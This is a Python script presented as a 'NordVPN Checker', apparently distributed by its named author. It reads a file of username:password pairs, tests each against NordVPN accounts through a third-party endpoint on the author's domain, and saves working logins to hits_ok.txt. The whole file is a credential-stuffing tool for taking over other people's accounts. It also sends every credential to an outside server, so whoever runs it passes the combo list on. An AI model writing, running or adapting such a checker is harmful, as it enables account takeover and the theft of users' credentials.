# <coded by @josifkhan - telegram>
# whatsapp: +8801868608046
# --------------------------------------------------------------------------------------------
import requests,sys,os
from datetime import datetime
from platform import uname
# colors
rd  = "\033[1;31m"
yl  = "\033[1;33m"
grn = "\033[1;32m"
en  = "\033[0m"
ok  = []
tts = [0]
xa  = []
line= "-"*60
# ----------------------------------------------
class NORDVPN:
	def __init__(self):
		if 'win' in str(uname()).lower():os.system("cls")
		else:os.system("clear")
		banner = f"""{rd}
███╗   ██╗ ██████╗ ██████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║
██╔██╗ ██║██║   ██║██████╔╝██║  ██║██║   ██║██████╔╝██╔██╗ ██║
██║╚██╗██║██║   ██║██╔══██╗██║  ██║╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
██║ ╚████║╚██████╔╝██║  ██║██████╔╝ ╚████╔╝ ██║     ██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
 -------------------------------------------------------------
[ Tools Name   : NordVPN Checker                              ]
[ WhatsApp     : +8801868608046                               ]
[ Version      : v3.0                                         ]
[ Github       : github.com/josifkhang                        ]
[ Time & Date  : {grn}{str(datetime.now())[0:26]}{rd}                   ]
 -------------------------------------------------------------{en}"""
		print(banner)
	def login(selfy,user,password,proxy_url):
		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{len(ok)}{en}/{tts[0]}")
		with requests.Session() as session:
			url = "https://nordvpn.josiftools.com/nordlogin"
			params = {
				"user": user,
				"pass": password,
				"proxies": proxy_url,
			}
			try:
				response = session.get(url, params=params, timeout=10);xa.append('a')
				return response.json()
			except Exception as e:print("Error:", e);return {"message":"Error","status":"badd"}
	def main(self):
		with open(input(f"⬛{grn}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
		print("-"*60)
		for account in accounts:
			user     = account.split(":")[0].strip()
			password = account.split(":")[1].strip()
			proxy_url= "http://username:password@host:port"
			response = self.login(user=user,password=password,proxy_url=proxy_url)
			if response['status']=='no':
				print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
			elif response['status']=='ok':
				print(f'\r⬛{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
				ok.append('1')
				with open("hits_ok.txt","a") as f2:f2.write(f"{user}:{password}\n")
			else:print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')

# -----------------------------------------------------------------------
email     = "user_email@josiftools.com"
password  = "user_pass"
proxy_url = "http://username:password@host:port" # http or socks5
# -----------------------------------------------------------------------
try:
	nd = NORDVPN()
	nd.main()
except KeyboardInterrupt:
	print(f"\n⬛DONE]: {len(xa)}/{grn}{len(ok)}{en}/{tts[0]}")
	input("+stopped by user / enter to exit")
	sys.exit()
# -----------------------------------------------------------------------
# ✅NOTICE: THIS API HAS LIMIT, IF U R INTERESTED IN ACTUAL SOURCE CODE YOU CAN CONTACT ME.
print(line)
print(f"\n⬛DONE]: {len(xa)}/{grn}{len(ok)}{en}/{tts[0]}")
input("enter to exit")
sys.exit()



